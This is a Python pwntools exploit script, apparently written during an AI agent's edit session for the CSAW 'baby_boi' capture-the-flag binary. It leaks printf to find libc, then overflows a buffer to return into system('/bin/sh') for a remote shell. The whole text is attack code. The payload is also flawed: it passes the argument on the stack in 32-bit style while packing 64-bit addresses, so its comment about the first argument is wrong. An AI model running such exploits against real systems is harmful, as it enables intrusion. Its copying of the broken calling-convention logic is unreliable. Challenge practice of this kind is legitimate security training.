from pwn import *

# Load the binary and libc
elf = ELF('./baby_boi')
libc = ELF('./libc-2.27.so')

# Connect to the server
p = remote('pwn.chal.csaw.io', 8000)

# Receive the initial output and the leaked printf address
p.recvuntil(b'Here I am: ')
leaked_printf = int(p.recvline().strip(), 16)

# Calculate libc base address
libc_base = leaked_printf - libc.symbols['printf']
log.info(f'Leaked printf: {hex(leaked_printf)}')
log.info(f'Libc base: {hex(libc_base)}')

# Calculate addresses of system and "/bin/sh"
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Construct the payload
# Buffer is 32 bytes, RBP is 8 bytes, then return address
payload = b'A' * 40  # 32 bytes buffer + 8 bytes RBP
payload += p64(system_addr)  # Return address - system
payload += p64(0xdeadbeef)  # Fake return address (not really needed but good practice)
payload += p64(binsh_addr)  # First argument to system: "/bin/sh"

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
end_of_edit

